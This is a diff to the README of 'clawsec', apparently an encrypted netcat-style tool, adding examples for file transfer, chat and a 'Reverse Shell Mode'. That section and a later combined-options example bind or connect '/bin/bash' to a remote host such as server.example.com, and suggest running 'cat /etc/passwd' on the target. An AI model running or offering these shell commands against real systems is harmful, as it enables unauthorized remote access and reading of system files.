@@ -16,25 +16,64 @@ echo "Hello encrypted world" | ./clawsec localhost 9999 -k "TestPassword123" -v
 
 ## File Transfer
 
+Secure file transmission with auto-close and statistics.
+
 ### Send a file
 ```bash
-# Receiver
-./clawsec -l -p 8080 -k "SecureFile2025" > received.tar.gz
+# Receiver (server)
+./clawsec -v -l -p 8080 -k "SecureFile2025" > received.tar.gz
 
-# Sender  
-./clawsec 192.168.1.100 8080 -k "SecureFile2025" < backup.tar.gz
+# Sender (client)
+./clawsec -v -k "SecureFile2025" 192.168.1.100 8080 < backup.tar.gz
 ```
 
-## Interactive Chat
+**Output:**
+```
+[Transfer complete] Sent 1024768 bytes
+[Transfer complete] Received 1024768 bytes
+```
 
-Both sides can type interactively:
+## Interactive Chat Mode
+
+Encrypted real-time chat with timestamps and colored output.
+
+Both sides need `-c` flag for chat mode:
 
 ```bash
 # Server
-./clawsec -l -p 4444 -k "ChatPassword"
+./clawsec -l -p 4444 -k "ChatPassword" -c
 
 # Client
-./clawsec server.example.com 4444 -k "ChatPassword"
+./clawsec -k "ChatPassword" -c server.example.com 4444
+```
+
+**Output:**
+```
+[10:30:15 Server] Hello!
+[10:30:18 Client] Hi there, connection is encrypted!
+```
+
+## Reverse Shell Mode
+
+Interactive shell with PTY support (vim, nano, top work correctly).
+
+```bash
+# Server (target machine)
+./clawsec -l -p 8888 -k "ShellPassword" -e /bin/bash
+
+# Client (your machine)
+./clawsec -k "ShellPassword" target.example.com 8888
+```
+
+**Available commands:**
+```bash
+ls -la
+pwd
+whoami
+cat /etc/passwd
+vim file.txt    # Interactive editors work!
+top             # Interactive programs work!
+exit            # Close connection
 ```
 
 ## Common Errors
@@ -65,17 +104,21 @@ Both sides can type interactively:
 
 ### Connection timeout
 ```bash
-./clawsec -l -p 5555 -k "Pass" -w 30
-```
-
-### UDP mode
-```bash
-./clawsec -l -p 6666 -k "Pass" -u
+./clawsec -k "Pass" -w 30 server.example.com 5555
 ```
 
 ### Verbose debugging
 ```bash
-./clawsec -l -p 7777 -k "Pass" -vv
+./clawsec -l -p 7777 -k "Pass" -v
+```
+
+### Combining options
+```bash
+# Chat mode with verbose output
+./clawsec -l -p 4444 -k "Pass" -c -v
+
+# Reverse shell with timeout
+./clawsec -k "Pass" -w 30 -e /bin/bash server.example.com 8888
 ```
 
 ## Security Best Practices
